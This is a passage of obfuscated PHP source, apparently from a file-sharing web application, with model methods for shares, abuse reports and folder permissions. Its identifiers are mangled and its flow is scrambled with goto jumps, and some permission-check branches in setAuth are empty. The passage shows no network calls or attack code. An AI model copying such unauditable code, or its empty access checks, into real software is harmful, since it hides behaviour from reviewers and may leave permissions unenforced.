$dÛ…ª¡›ñ÷, $B°ˆ‰ Ñâ[379] => $Aï–ŒæĞñ«, $B°ˆ‰ Ñâ[464] => intval($bÙ±›Õ¡•Ç[$B°ˆ‰ Ñâ[464]]), $B°ˆ‰ Ñâ[2233] => 0, $B°ˆ‰ Ñâ[2234] => -1); if ($bÙ±›Õ¡•Ç[$B°ˆ‰ Ñâ[2233]]) { $CÑÃƒ‘–öÑ[$B°ˆ‰ Ñâ[2233]] = $bÙ±›Õ¡•Ç[$B°ˆ‰ Ñâ[2233]]; } else { if ($bÙ±›Õ¡•Ç[$B°ˆ‰ Ñâ[2234]]) { $CÑÃƒ‘–öÑ[$B°ˆ‰ Ñâ[2234]] = $bÙ±›Õ¡•Ç[$B°ˆ‰ Ñâ[2234]]; } } $f¬ø¾ï®„[] = $CÑÃƒ‘–öÑ; } goto cè‹š‚×µù; døàÖÒ¦§: $B°ˆ‰ Ñâ =& $_SERVER[©]; if (!is_array($e×¢¼„òó¡)) { return !1; } $BÕÚñëœèå = Model($B°ˆ‰ Ñâ[2232]); goto AùòöŠ˜äŠ; cè‹š‚×µù: return $BÕÚñëœèå->addAll($f¬ø¾ï®„, array(), !0); goto a’ÕäÒàÙ; a’ÕäÒàÙ: } public function numViewAdd($d÷á¤ßÂ§‚) { $b…ñ¬Ç¯‡ì =& $_SERVER[©]; $F²‚ßøã°Â = array($b…ñ¬Ç¯‡ì[448] => $d÷á¤ßÂ§‚); $this->where($F²‚ßøã°Â)->setAdd($b…ñ¬Ç¯‡ì[2228]); } public function numDownloadAdd($cÒÑ“×÷Í‹) { $Bš¦Ø‰‚Íè =& $_SERVER[©]; $D¯º±ƒë = array($Bš¦Ø‰‚Íè[448] => $cÒÑ“×÷Í‹); $this->where($D¯º±ƒë)->setAdd($Bš¦Ø‰‚Íè[2229]); } protected function shareEdit($B«é¤ŠÇæÅ, $AŠ–öø°Ê) { goto eñ—”†—Öè; Aš×°±: foreach ($a©Î„ºÙÒ½ as $a‰éœÊ¯¾³) { if (!array_key_exists($a‰éœÊ¯¾³, $AŠ–öø°Ê)) { continue; } $Còôù‘½­·[$a‰éœÊ¯¾³] = $AŠ–öø°Ê[$a‰éœÊ¯¾³]; } $this->shareEventAdd($b¼„§´å·[$d•£ŸÅˆó[377]], $AŠ–öø°Ê, $d•£ŸÅˆó[2069]); $this->where(array($d•£ŸÅˆó[448] => $B«é¤ŠÇæÅ))->save($Còôù‘½­·); goto AŸ²˜’‚Ì; b¼±ÜàÓÅ: $this->_checkLinkShare($AŠ–öø°Ê, $b¼„§´å·); $Còôù‘½­· = array(); $a©Î„ºÙÒ½ = explode($d•£ŸÅˆó[57], $d•£ŸÅˆó[2235]); goto Aš×°±; AŸ²˜’‚Ì: if (isset($AŠ–öø°Ê[$d•£ŸÅˆó[2221]])) { $this->_shareAuthSet($B«é¤ŠÇæÅ, $AŠ–öø°Ê[$d•£ŸÅˆó[2221]]); } return !0; goto a¯ƒ¼Ü¥—; eñ—”†—Öè: $d•£ŸÅˆó =& $_SERVER[©]; $b¼„§´å· = $this->getInfo($B«é¤ŠÇæÅ); if (!$b¼„§´å·) { return !1; } goto b¼±ÜàÓÅ; a¯ƒ¼Ü¥—: } private function _checkLinkShare($aØÀô…Éò, $dâ¬ØÙ‰ç) { goto AßØÑÙë‡Ó; EÂÁÛ ¸§‹: if ($dâ¬ØÙ‰ç[$dÔØÜÙÖÎì[399]][$dÔØÜÙÖÎì[39]] != $dÔØÜÙÖÎì[177]) { $F†¸Î¶‘ = $this->_folderReport($A°˜ Öº–); if (!$F†¸Î¶‘) { return; } show_json(LNG($dÔØÜÙÖÎì[2236]) . $dÔØÜÙÖÎì[2237] . $F†¸Î¶‘, !1); } $BÎá‹‰¶ø = Model($dÔØÜÙÖÎì[752])->fileInfoGet($dâ¬ØÙ‰ç[$dÔØÜÙÖÎì[399]][$dÔØÜÙÖÎì[377]]); if (!$BÎá‹‰¶ø) { return; } goto bØŸë¬æ”; bØŸë¬æ”: $B‰ÅÙÉõ·Ÿ = $this->shareFileMeta($BÎá‹‰¶ø[$dÔØÜÙÖÎì[427]]); if (isset($B‰ÅÙÉõ·Ÿ[$dÔØÜÙÖÎì[368]]) && $B‰ÅÙÉõ·Ÿ[$dÔØÜÙÖÎì[368]] == $dÔØÜÙÖÎì[93]) { show_json(LNG($dÔØÜÙÖÎì[2238]), !1); } goto D®ìÇåŞ®; AßØÑÙë‡Ó: $dÔØÜÙÖÎì =& $_SERVER[©]; if ($aØÀô…Éò[$dÔØÜÙÖÎì[454]] != $dÔØÜÙÖÎì[93]) { return; } $A°˜ Öº– = $dâ¬ØÙ‰ç[$dÔØÜÙÖÎì[399]][$dÔØÜÙÖÎì[377]]; goto EÂÁÛ ¸§‹; D®ìÇåŞ®: } private function _folderReport($bŒê‘¯Èö£) { goto a’¹Ä³àÍé; c¯©èø‹©’: $F‘·°²ÖÆ« = substr($CÛ÷ÆĞ É°[$F£ÔÇ¿ª‡Ë[467]], strpos($CÛ÷ÆĞ É°[$F£ÔÇ¿ª‡Ë[467]], $eëãÛ ¹š)); $eº±¢õ¾ = array($F£ÔÇ¿ª‡Ë[377] => array($F£ÔÇ¿ª‡Ë[17], trim($F‘·°²ÖÆ«, $F£ÔÇ¿ª‡Ë[57]))); $d©„›ŞÎœƒ = Model($F£ÔÇ¿ª‡Ë[752])->where($eº±¢õ¾)->field($F£ÔÇ¿ª‡Ë[38])->select(); goto BÀÚÂìŠ²Ø; CÚˆ²ùçñ‡: $eº±¢õ¾ = array($F£ÔÇ¿ª‡Ë[427] => array($F£ÔÇ¿ª‡Ë[17], $f´ŠƒŞ­Ş), $F£ÔÇ¿ª‡Ë[467] => array($F£ÔÇ¿ª‡Ë[751], "\x25{$eëãÛ ¹š}\x25"), $F£ÔÇ¿ª‡Ë[405] => 0); $CÛ÷ÆĞ É° = Model($F£ÔÇ¿ª‡Ë[752])->where($eº±¢õ¾)->field($F£ÔÇ¿ª‡Ë[2240])->find(); if (!$CÛ÷ÆĞ É°) { return !1; } goto c¯©èø‹©’; d×ÏÎ”ÔÄ: if (!$f´ŠƒŞ­Ş) { return !1; } $f´ŠƒŞ­Ş = array_to_keyvalue($f´ŠƒŞ­Ş, $F£ÔÇ¿ª‡Ë[43], $F£ÔÇ¿ª‡Ë[427]); $eëãÛ ¹š = $F£ÔÇ¿ª‡Ë[57] . $bŒê‘¯Èö£ . $F£ÔÇ¿ª‡Ë[57]; goto CÚˆ²ùçñ‡; BÀÚÂìŠ²Ø: $f±ÅÍíŒÎ„ = array_to_keyvalue($d©„›ŞÎœƒ, $F£ÔÇ¿ª‡Ë[43], $F£ÔÇ¿ª‡Ë[38]); $f±ÅÍíŒÎ„[] = $CÛ÷ÆĞ É°[$F£ÔÇ¿ª‡Ë[38]]; return implode($F£ÔÇ¿ª‡Ë[18], $f±ÅÍíŒÎ„); goto fóÌ³İŠ³„; a’¹Ä³àÍé: $F£ÔÇ¿ª‡Ë =& $_SERVER[©]; $eº±¢õ¾ = array($F£ÔÇ¿ª‡Ë[427] => array($F£ÔÇ¿ª‡Ë[923], 0), $F£ÔÇ¿ª‡Ë[688] => 3); $f´ŠƒŞ­Ş = Model($F£ÔÇ¿ª‡Ë[2239])->where($eº±¢õ¾)->field($F£ÔÇ¿ª‡Ë[427])->select(); goto d×ÏÎ”ÔÄ; fóÌ³İŠ³„: } protected function remove($e‰°ÙÆãìß) { goto Bƒã´¸œÓç; fİÄÊŒÓ¤ƒ: for ($FÖ¯©°Åˆ = 0; $FÖ¯©°Åˆ < count($f‹ó°Ş§á°); $FÖ¯©°Åˆ++) { $d’©çÅ£÷á = $this->getInfo($f‹ó°Ş§á°[$FÖ¯©°Åˆ]); if ($d’©çÅ£÷á[$bºééÙ¯¹[456]] == $bºééÙ¯¹[93]) { Model($bºééÙ¯¹[513])->eventShare($d’©çÅ£÷á[$bºééÙ¯¹[377]], $bºééÙ¯¹[2226]); } if ($d’©çÅ£÷á[$bºééÙ¯¹[454]] == $bºééÙ¯¹[93]) { Model($bºééÙ¯¹[513])->eventShare($d’©çÅ£÷á[$bºééÙ¯¹[377]], $bºééÙ¯¹[2225]); } } return $aÍ¼Û ÖºÔ; goto f¬˜«¦ÑÕÀ; c…†é¡ãÒĞ: $aÍ¼Û ÖºÔ = $this->where($d­•´òë¬Ó)->delete(); if ($aÍ¼Û ÖºÔ) { Model($bºééÙ¯¹[545])->where(array($bºééÙ¯¹[449] => $e‰°ÙÆãìß))->delete(); } $f‹ó°Ş§á° = is_array($e‰°ÙÆãìß) ? $e‰°ÙÆãìß[1] : array($e‰°ÙÆãìß); goto fİÄÊŒÓ¤ƒ; Bƒã´¸œÓç: $bºééÙ¯¹ =& $_SERVER[©]; if (is_array($e‰°ÙÆãìß)) { $e‰°ÙÆãìß = array($bºééÙ¯¹[17], $e‰°ÙÆãìß); } $d­•´òë¬Ó = array($bºééÙ¯¹[449] => $e‰°ÙÆãìß); goto c…†é¡ãÒĞ; f¬˜«¦ÑÕÀ: } protected function removeBySource($DŠãŒÛ†‘—) { goto cğ‹…œ‘; dÇìšÒó: $this->where($e‚ß¦‡Ûë)->delete(); Model($BĞ¥”†…è¿[545])->where($e‚ß¦‡Ûë)->delete(); goto b§ÚŒäÎ‡®; cğ‹…œ‘: $BĞ¥”†…è¿ =& $_SERVER[©]; $e‚ß¦‡Ûë = array($BĞ¥”†…è¿[391] => array($BĞ¥”†…è¿[392], $DŠãŒÛ†‘—)); $f÷“â¡ÆÚõ = $this->field($BĞ¥”†…è¿[449])->where($e‚ß¦‡Ûë)->select(); goto BØ÷•¥«Ù©; BØ÷•¥«Ù©: $f÷“â¡ÆÚõ = array_to_keyvalue($f÷“â¡ÆÚõ, $BĞ¥”†…è¿[43], $BĞ¥”†…è¿[449]); if (!$f÷“â¡ÆÚõ) { return; } $e‚ß¦‡Ûë = array($BĞ¥”†…è¿[448] => array($BĞ¥”†…è¿[392], $f÷“â¡ÆÚõ)); goto dÇìšÒó; b§ÚŒäÎ‡®: } public function listAll($fÖš˜İ¬äÌ) { goto A‡ëòÄÒ½; d®Ë¹¬ºÏ®: return $bÎˆ®ÚÎ; goto f¼ˆÆ•¥÷; Dğäù„äƒ: if ($fÖš˜İ¬äÌ[$C¤¬ÔÅäŞæ[701]]) { $fóÔé‡‰›² = $fÖš˜İ¬äÌ[$C¤¬ÔÅäŞæ[702]] ? $fÖš˜İ¬äÌ[$C¤¬ÔÅäŞæ[702]] : strtotime(date($C¤¬ÔÅäŞæ[2241])); $DôŠ¢º°Ú[$C¤¬ÔÅäŞæ[197]] = array($C¤¬ÔÅäŞæ[330], array($fÖš˜İ¬äÌ[$C¤¬ÔÅäŞæ[701]], $fóÔé‡‰›²)); } if ($fÖš˜İ¬äÌ[$C¤¬ÔÅäŞæ[39]]) { $DôŠ¢º°Ú[$fÖš˜İ¬äÌ[$C¤¬ÔÅäŞæ[39]]] = 1; } else { $DôŠ¢º°Ú[] = array($C¤¬ÔÅäŞæ[454] => array($C¤¬ÔÅäŞæ[923], 0), $C¤¬ÔÅäŞæ[456] => array($C¤¬ÔÅäŞæ[923], 0), $C¤¬ÔÅäŞæ[2216] => $C¤¬ÔÅäŞæ[2184]); } if ($fÖš˜İ¬äÌ[$C¤¬ÔÅäŞæ[2180]]) { $DôŠ¢º°Ú[] = array($C¤¬ÔÅäŞæ[451] => $fÖš˜İ¬äÌ[$C¤¬ÔÅäŞæ[2180]], $C¤¬ÔÅäŞæ[1338] => array($C¤¬ÔÅäŞæ[751], "\x25{$fÖš˜İ¬äÌ[$C¤¬ÔÅäŞæ[2180]]}\x25"), $C¤¬ÔÅäŞæ[2216] => $C¤¬ÔÅäŞæ[2184]); } goto eÛªÈ‘ÀŒ; A‡ëòÄÒ½: $C¤¬ÔÅäŞæ =& $_SERVER[©]; $DôŠ¢º°Ú = array(); if ($fÖš˜İ¬äÌ[$C¤¬ÔÅäŞæ[1434]]) { $DôŠ¢º°Ú[$C¤¬ÔÅäŞæ[1434]] = $fÖš˜İ¬äÌ[$C¤¬ÔÅäŞæ[1434]]; } goto Dğäù„äƒ; eÛªÈ‘ÀŒ: $bÎˆ®ÚÎ = $this->_makeOrder()->where($DôŠ¢º°Ú)->selectPage(20); if (empty($bÎˆ®ÚÎ[$C¤¬ÔÅäŞæ[363]])) { return array(); } $this->_listDataApply($bÎˆ®ÚÎ[$C¤¬ÔÅäŞæ[363]]); goto d®Ë¹¬ºÏ®; f¼ˆÆ•¥÷: } public function listDataApply($Aùò™ËÂê) { $this->_listDataApply($Aùò™ËÂê); return $Aùò™ËÂê; } private function _listDataApply(&$F†ŒğÚŒì–) { $f ¡¼È¶Ëˆ =& $_SERVER[©]; $C‹Œƒó®Üâ = array_to_keyvalue($F†ŒğÚŒì–, $f ¡¼È¶Ëˆ[43], $f ¡¼È¶Ëˆ[1434]); $F‘ÔÖ¢ùÁ« = Model($f ¡¼È¶Ëˆ[485])->userListInfo(array_unique($C‹Œƒó®Üâ)); $cÚğÀ¡ÛŒ£ = array_to_keyvalue($F†ŒğÚŒì–, $f ¡¼È¶Ëˆ[43], $f ¡¼È¶Ëˆ[377]); $CÄÌ–É˜Âå = Model($f ¡¼È¶Ëˆ[752])->sourceListInfo($cÚğÀ¡ÛŒ£, !0); foreach ($F†ŒğÚŒì– as &$F˜‰àí‘ñ·) { $Fö¿¬ä¿ë = $F˜‰àí‘ñ·[$f ¡¼È¶Ëˆ[1434]]; $F˜‰àí‘ñ·[$f ¡¼È¶Ëˆ[2242]] = $F‘ÔÖ¢ùÁ«[$Fö¿¬ä¿ë] ? $F‘ÔÖ¢ùÁ«[$Fö¿¬ä¿ë] : !1; $dµ¸¸ÔçÙÌ = $F˜‰àí‘ñ·[$f ¡¼È¶Ëˆ[377]]; $F˜‰àí‘ñ·[$f ¡¼È¶Ëˆ[399]] = $CÄÌ–É˜Âå[$dµ¸¸ÔçÙÌ] ? $CÄÌ–É˜Âå[$dµ¸¸ÔçÙÌ] : !1; } } private function _makeOrder($F°Û­° ±ã = '') { goto eßä¢“§À; c´Îæå…µ: $F°Û­° ±ã = $F°Û­° ±ã . "{$bÈŠŒ±ëŠô}\x20{$aÒçÓš­æĞ}"; return $this->order($F°Û­° ±ã); goto a§ÇêÉâÀ¼; eßä¢“§À: $D‹­ñ³™®† =& $_SERVER[©]; $aÅæ¶†£ó = array($D‹­ñ³™®†[197], $D‹­ñ³™®†[702], $D‹­ñ³™®†[2228], $D‹­ñ³™®†[2229]); $c“ƒÅªÔ‘ = array($D‹­ñ³™®†[410] => $D‹­ñ³™®†[411], $D‹­ñ³™®†[412] => $D‹­ñ³™®†[413]); goto D‰‹áç¨ŠÆ; D‰‹áç¨ŠÆ: $bÈŠŒ±ëŠô = Input::get($D‹­ñ³™®†[415], $D‹­ñ³™®†[17], $D‹­ñ³™®†[397], $aÅæ¶†£ó); $aÒçÓš­æĞ = Input::get($D‹­ñ³™®†[416], $D‹­ñ³™®†[17], $D‹­ñ³™®†[2243], array($D‹­ñ³™®†[2179], $D‹­ñ³™®†[412])); $aÒçÓš­æĞ = $c“ƒÅªÔ‘[$aÒçÓš­æĞ]; goto c´Îæå…µ; a§ÇêÉâÀ¼: } public function reportAdd($Dœé—‡›´¼) { $f“Â¦íÆšã =& $_SERVER[©]; $Dˆˆæ…‡äÛ = array($f“Â¦íÆšã[449] => $Dœé—‡›´¼[$f“Â¦íÆšã[449]], $f“Â¦íÆšã[1434] => USER_ID); if (Model($f“Â¦íÆšã[2239])->where($Dˆˆæ…‡äÛ)->find()) { return !1; } $aèï¨¼¾¾ = array($f“Â¦íÆšã[449] => $Dœé—‡›´¼[$f“Â¦íÆšã[449]], $f“Â¦íÆšã[1338] => $Dœé—‡›´¼[$f“Â¦íÆšã[1338]], $f“Â¦íÆšã[377] => $Dœé—‡›´¼[$f“Â¦íÆšã[377]], $f“Â¦íÆšã[427] => $Dœé—‡›´¼[$f“Â¦íÆšã[427]], $f“Â¦íÆšã[1434] => USER_ID, $f“Â¦íÆšã[39] => $Dœé—‡›´¼[$f“Â¦íÆšã[39]], $f“Â¦íÆšã[413] => $Dœé—‡›´¼[$f“Â¦íÆšã[413]]); return Model($f“Â¦íÆšã[2239])->add($aèï¨¼¾¾); } public function reportList($cö—å©Ğã) { goto Dî¸Ùöó‘®; Dî¸Ùöó‘®: $Cƒ±Ãİ£Şğ =& $_SERVER[©]; $F·‘¹‰Æ© = array(); if ($cö—å©Ğã[$Cƒ±Ãİ£Şğ[701]]) { $a£Èà£ù’ = $cö—å©Ğã[$Cƒ±Ãİ£Şğ[702]] ? $cö—å©Ğã[$Cƒ±Ãİ£Şğ[702]] : strtotime(date($Cƒ±Ãİ£Şğ[2241])); $F·‘¹‰Æ©[$Cƒ±Ãİ£Şğ[197]] = array($Cƒ±Ãİ£Şğ[330], array($cö—å©Ğã[$Cƒ±Ãİ£Şğ[701]], $a£Èà£ù’)); } goto cò…ãÃÌ¹¾; E‰ÉáÉ×¿Ÿ: if (empty($E¾•´øò±[$Cƒ±Ãİ£Şğ[363]])) { return array(); } $this->_listDataApply($E¾•´øò±[$Cƒ±Ãİ£Şğ[363]]); return $E¾•´øò±; goto c”§ˆöõ¤è; e“´ºèî­: $f™Å‰…¿éù = array($Cƒ±Ãİ£Şğ[410] => $Cƒ±Ãİ£Şğ[411], $Cƒ±Ãİ£Şğ[412] => $Cƒ±Ãİ£Şğ[413]); $BØƒÏÀÜ´¨ = $Cƒ±Ãİ£Şğ[2247] . $f™Å‰…¿éù[$eˆ«Óæ™±]; $E¾•´øò± = Model($Cƒ±Ãİ£Şğ[2239])->where($F·‘¹‰Æ©)->order($BØƒÏÀÜ´¨)->selectPage(20); goto E‰ÉáÉ×¿Ÿ; cò…ãÃÌ¹¾: if (isset($cö—å©Ğã[$Cƒ±Ãİ£Şğ[39]]) && in_array($cö—å©Ğã[$Cƒ±Ãİ£Şğ[39]], array($Cƒ±Ãİ£Şğ[93], $Cƒ±Ãİ£Şğ[2244], $Cƒ±Ãİ£Şğ[2245], $Cƒ±Ãİ£Şğ[2246], $Cƒ±Ãİ£Şğ[1917]))) { $F·‘¹‰Æ©[$Cƒ±Ãİ£Şğ[39]] = $cö—å©Ğã[$Cƒ±Ãİ£Şğ[39]]; } if (isset($cö—å©Ğã[$Cƒ±Ãİ£Şğ[688]]) && in_array($cö—å©Ğã[$Cƒ±Ãİ£Şğ[688]], array($Cƒ±Ãİ£Şğ[476], $Cƒ±Ãİ£Şğ[93], $Cƒ±Ãİ£Şğ[2244], $Cƒ±Ãİ£Şğ[2245]))) { $F·‘¹‰Æ©[$Cƒ±Ãİ£Şğ[688]] = $cö—å©Ğã[$Cƒ±Ãİ£Şğ[688]]; } $eˆ«Óæ™± = Input::get($Cƒ±Ãİ£Şğ[416], $Cƒ±Ãİ£Şğ[17], $Cƒ±Ãİ£Şğ[2243], array($Cƒ±Ãİ£Şğ[2179], $Cƒ±Ãİ£Şğ[412])); goto e“´ºèî­; c”§ˆöõ¤è: } public function reportStatus($AÄ…°ÔÊì÷) { goto c‰Ë™œÛÌÒ; F‚ÏÊ¼‚ŸÔ: return $Dœ·…˜™Ï¾; goto fª‚İ×; EÜÚ—©ñ÷: if (!$cƒ× ¶öàÒ) { return !1; } $D¿«…ÂÍÚ = array($Bë´¡·¦ˆ[688] => $AÄ…°ÔÊì÷[$Bë´¡·¦ˆ[688]]); if ($AÄ…°ÔÊì÷[$Bë´¡·¦ˆ[688]] == $Bë´¡·¦ˆ[2245] && $cƒ× ¶öàÒ[$Bë´¡·¦ˆ[688]] == $Bë´¡·¦ˆ[2245]) { $D¿«…ÂÍÚ[$Bë´¡·¦ˆ[688]] = 0; } goto a‰§ñ“äÇ‹; c‰Ë™œÛÌÒ: $Bë´¡·¦ˆ =& $_SERVER[©]; $cÂ¸ÆÂ¥Œö = array($Bë´¡·¦ˆ[375] => $AÄ…°ÔÊì÷[$Bë´¡·¦ˆ[375]]); $cƒ× ¶öàÒ = Model($Bë´¡·¦ˆ[2239])->where($cÂ¸ÆÂ¥Œö)->field($Bë´¡·¦ˆ[2248])->find(); goto EÜÚ—©ñ÷; a‰§ñ“äÇ‹: $Dœ·…˜™Ï¾ = Model($Bë´¡·¦ˆ[2239])->where($cÂ¸ÆÂ¥Œö)->save($D¿«…ÂÍÚ); if ($AÄ…°ÔÊì÷[$Bë´¡·¦ˆ[688]] == $Bë´¡·¦ˆ[2244]) { if ($cƒ× ¶öàÒ[$Bë´¡·¦ˆ[427]] != $Bë´¡·¦ˆ[476] && $this->shareFileMeta($cƒ× ¶öàÒ[$Bë´¡·¦ˆ[427]])) { $this->shareFileMeta($cƒ× ¶öàÒ[$Bë´¡·¦ˆ[427]], 0); } $this->remove($cƒ× ¶öàÒ[$Bë´¡·¦ˆ[449]]); return !0; } if ($Dœ·…˜™Ï¾ && $AÄ…°ÔÊì÷[$Bë´¡·¦ˆ[688]] == $Bë´¡·¦ˆ[2245]) { $B™è£½ Ú = $D¿«…ÂÍÚ[$Bë´¡·¦ˆ[688]] == $Bë´¡·¦ˆ[2245] ? 1 : 0; $this->shareFileMeta($cƒ× ¶öàÒ[$Bë´¡·¦ˆ[427]], $B™è£½ Ú); $this->removeByFile($cƒ× ¶öàÒ[$Bë´¡·¦ˆ[427]]); } goto F‚ÏÊ¼‚ŸÔ; fª‚İ×: } private function removeByFile($fŠ£‘ Ôì) { goto fÑß¥Â»»Æ; aßî±½‹õé: $B‹”ÔÇñš = array($C›—ÅÈœÅ[377] => array($C›—ÅÈœÅ[17], $a Ä×È‡”‚), $C›—ÅÈœÅ[454] => 1); $fó‚É¯ÜÁ = Model($C›—ÅÈœÅ[2079])->where($B‹”ÔÇñš)->field($C›—ÅÈœÅ[449])->select(); if (empty($fó‚É¯ÜÁ)) { return; } goto a´ÈÀ¿ÇªÖ; a´ÈÀ¿ÇªÖ: $cÍÀİ¡áÉÄ = array_to_keyvalue($fó‚É¯ÜÁ, $C›—ÅÈœÅ[43], $C›—ÅÈœÅ[449]); $this->remove($cÍÀİ¡áÉÄ); goto DÛÕ”³³¤—; fÑß¥Â»»Æ: $C›—ÅÈœÅ =& $_SERVER[©]; $fó‚É¯ÜÁ = Model($C›—ÅÈœÅ[752])->where(array($C›—ÅÈœÅ[427] => $fŠ£‘ Ôì))->field($C›—ÅÈœÅ[377])->select(); $a Ä×È‡”‚ = array_to_keyvalue($fó‚É¯ÜÁ, $C›—ÅÈœÅ[43], $C›—ÅÈœÅ[377]); goto aßî±½‹õé; DÛÕ”³³¤—: } private function shareFileMeta($fŸˆ¢†ßƒ, $eĞ…ÍÇïÊ˜ = null) { $A§Ì¹ƒÂÔÄ =& $_SERVER[©]; $F·Ğ‚„…ºõ = array($A§Ì¹ƒÂÔÄ[427] => $fŸˆ¢†ßƒ, $A§Ì¹ƒÂÔÄ[99] => $A§Ì¹ƒÂÔÄ[2249]); if (is_null($eĞ…ÍÇïÊ˜)) { return Model($A§Ì¹ƒÂÔÄ[2250])->where($F·Ğ‚„…ºõ)->find(); } $F·Ğ‚„…ºõ[$A§Ì¹ƒÂÔÄ[368]] = $eĞ…ÍÇïÊ˜; Model($A§Ì¹ƒÂÔÄ[2250])->add($F·Ğ‚„…ºõ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\165\162\143\145\137\141\x75\164\x68"; public function getAuth($c–³´±«) { goto c–©¤¼Ş—; fºíÑÑ  : $eîŒİ‹ñë = $this->field($bÀŠñŠ‹×)->order($eó«ëØ¿[375])->where($e‹”§óØñ)->select(); $b¶î©¶›¸ = array(); foreach ($eîŒİ‹ñë as $bÜã‚Î¥‡) { if (Model($eó«ëØ¿[2252])->listData($bÜã‚Î¥‡[$eó«ëØ¿[2233]])) { $b¶î©¶›¸[] = $bÜã‚Î¥‡; } } goto bã¸¿·ì¥; c–©¤¼Ş—: $eó«ëØ¿ =& $_SERVER[©]; $bÀŠñŠ‹× = $eó«ëØ¿[2251]; $e‹”§óØñ = array($eó«ëØ¿[377] => $c–³´±«); goto fºíÑÑ  ; bã¸¿·ì¥: return $b¶î©¶›¸; goto CÆ±‹˜œ¥; CÆ±‹˜œ¥: } public function setAuth($CÎ¹ô­½, $fÅÒ¯Æˆ…ƒ) { goto eÈÏÀôî‚; B‹ò«ù™ÏÇ: $f×­‡Ğ´ÂÌ = 1; $FëÑ ß¾á = $B½ÃªĞòØ[$C„›Úˆ£·Í[464]]; if ($FëÑ ß¾á != $f×­‡Ğ´ÂÌ) { $c§„æß¶¼£ = array($C„›Úˆ£·Í[2102] => $FëÑ ß¾á); $DÙÙõÅ§×² = Model($C„›Úˆ£·Í[2178])->field($C„›Úˆ£·Í[1434])->where($c§„æß¶¼£)->select(); $DÙÙõÅ§×² = array_to_keyvalue($DÙÙõÅ§×², $C„›Úˆ£·Í[43], $C„›Úˆ£·Í[1434]); } goto fèÜÔ®òç; fèÜÔ®òç: $AÇ‡¹ª£Ù† = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $CÇğ¦¼á‘¥ = array(); foreach ($fÅÒ¯Æˆ…ƒ as $côõÌã™Û) { if (!in_array($côõÌã™Û[$C„›Úˆ£·Í[379]], $AÇ‡¹ª£Ù†)) { show_json(LNG($C„›Úˆ£·Í[2253]), !1); } if ($FëÑ ß¾á != $f×­‡Ğ´ÂÌ) { if ($côõÌã™Û[$C„›Úˆ£·Í[379]] == SourceModel::TYPE_GROUP) { } if ($côõÌã™Û[$C„›Úˆ£·Í[464]] != 0 && !in_array($côõÌã™Û[$C„›Úˆ£·Í[464]], $DÙÙõÅ§×²)) { } } if ($côõÌã™Û[$C„›Úˆ£·Í[464]] == 0) { $côõÌã™Û[$C„›Úˆ£·Í[379]] = SourceModel::TYPE_USER; } $CÇğ¦¼á‘¥[] = array($C„›Úˆ£·Í[377] => $CÎ¹ô­½, $C„›Úˆ£·Í[379] => intval($côõÌã™Û[$C„›Úˆ£·Í[379]]), $C„›Úˆ£·Í[464] => intval($côõÌã™Û[$C„›Úˆ£·Í[464]]), $C„›Úˆ£·Í[2233] => intval($côõÌã™Û[$C„›Úˆ£·Í[2233]]) ? intval($côõÌã™Û[$C„›Úˆ£·Í[2233]]) : 0, $C„›Úˆ£·Í[2234] => intval($côõÌã™Û[$C„›Úˆ£·Í[2234]]) ? intval($côõÌã™Û[$C„›Úˆ£·Í[2234]]) : -1); } goto fğ©ÃÃ¬»ó; fğ©ÃÃ¬»ó: $this->where(array($C„›Úˆ£·Í[391] => $CÎ¹ô­½))->delete(); $this->addAll($CÇğ¦¼á‘¥); return !0; goto c‡Î†»ÜÈñ; eÈÏÀôî‚: $C„›Úˆ£·Í =& $_SERVER[©]; $B½ÃªĞòØ = Model($C„›Úˆ£·Í[1114])->sourceInfo($CÎ¹ô­½); if ($B½ÃªĞòØ[$C„›Úˆ£·Í[379]] != SourceModel::TYPE_GROUP) { return !1; } goto B‹ò«ù™ÏÇ; c‡Î†»ÜÈñ: } public function authClear($däâ«™âˆà) { $F¼µŠ‰¼„é =& $_SERVER[©]; $d†ñè„•Ó‰ = Model($F¼µŠ‰¼„é[1114])->sourceInfo($däâ«™âˆà); $c©İÇÌØ¸´ = array($däâ«™âˆà); if ($d†ñè„•Ó‰[$F¼µŠ‰¼„é[378]] == $F¼µŠ‰¼„é[93]) { $D•”Ğ²ÖÒÛ = array($F¼µŠ‰¼„é[533] => array($F¼µŠ‰¼„é[491], $d†ñè„•Ó‰[$F¼µŠ‰¼„é[467]] . $däâ«™âˆà . $F¼µŠ‰¼„é[492])); $c©İÇÌØ¸´ = Model($F¼µŠ‰¼„é[1114])->field($F¼µŠ‰¼„é[391])->where($D•”Ğ²ÖÒÛ)->getField($F¼µŠ‰¼„é[377], !0); $c©İÇÌØ¸´[] = $däâ«™âˆà; } $this->where(array($F¼µŠ‰¼„é[391] => array($F¼µŠ‰¼„é[392], $c©İÇÌØ¸´)))->delete(); return !0; } public function get($d¯ÊÎÛ¯šÁ) { $FÎš­™®‹Â = $this->getSourceList(array($d¯ÊÎÛ¯šÁ), !0); return $FÎš­™®‹Â[0]; } public function getSourceList($BÕÕØëùÙÍ, $f÷Ş‘—¿•‰ = false) { goto Cà³‡´Ö§ê; f³´šŒ²í‘: $c‘œ±Ê™Ò = array($c‹ÄÕî™’¦[391] => array($c‹ÄÕî™’¦[392], $Eâ‘ÈÆ˜Î‘)); $eæãâ“™à± = $this->field($A§…ç´âá)->where($c‘œ±Ê™Ò)->select(); $eæãâ“™à± = array_to_keyvalue_group($eæãâ“™à±, $c‹ÄÕî™’¦[377]); goto f£›Õ‘Ü; F¬š§’øºÌ: $Eâ‘ÈÆ˜Î‘ = array_values(array_unique($Eâ‘ÈÆ˜Î‘)); if (!$Eâ‘ÈÆ˜Î‘) { return array(); } $A§…ç´âá = $c‹ÄÕî™’¦[2255]; goto f³´šŒ²í‘; f£›Õ‘Ü: $aÉ‘Ä¾ù£† = array(); foreach ($f÷Ş‘—¿•‰ as $c¿Ö›†ø => $e¸øª…ß•Ï) { $aÉ‘Ä¾ù£†[$c¿Ö›†ø] = $this->makeSourceAuth($e¸øª…ß•Ï, $eæãâ“™à±); } return $aÉ‘Ä¾ù£†; goto cğ–ÅÈ´; Cà³‡´Ö§ê: $c‹ÄÕî™’¦ =& $_SERVER[©]; if (!$BÕÕØëùÙÍ) { return array(); } $a—ğŞËï÷ = Model($c‹ÄÕî™’¦[1114]); goto c¢ãˆµåÑ; c¢ãˆµåÑ: if (!$f÷Ş‘—¿•‰) { $c‘œ±Ê™Ò = array($c‹ÄÕî™’¦[391] => array($c‹ÄÕî™’¦[392], $BÕÕØëùÙÍ)); $f÷Ş‘—¿•‰ = 